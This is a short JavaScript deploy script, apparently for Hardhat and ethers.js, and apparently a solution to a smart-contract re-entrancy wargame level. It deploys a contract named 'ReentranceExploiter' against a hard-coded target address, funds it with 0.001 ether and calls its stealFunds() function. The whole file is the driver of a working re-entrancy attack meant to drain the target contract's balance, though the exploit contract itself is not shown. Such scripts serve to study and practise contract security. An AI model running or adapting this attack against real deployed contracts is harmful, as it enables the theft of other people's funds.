async function main() {
    // We get the contract to deploy
    const ReentranceExploiter = await ethers.getContractFactory("ReentranceExploiter");
    const renExploiter = await ReentranceExploiter.deploy("0xb9c9404829599A27305d78a1CaF957A080bB8922", { value: ethers.utils.parseEther("0.001") });
    console.log("ReentranceExploiter deployed to:", renExploiter.address);

    await renExploiter.stealFunds();
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
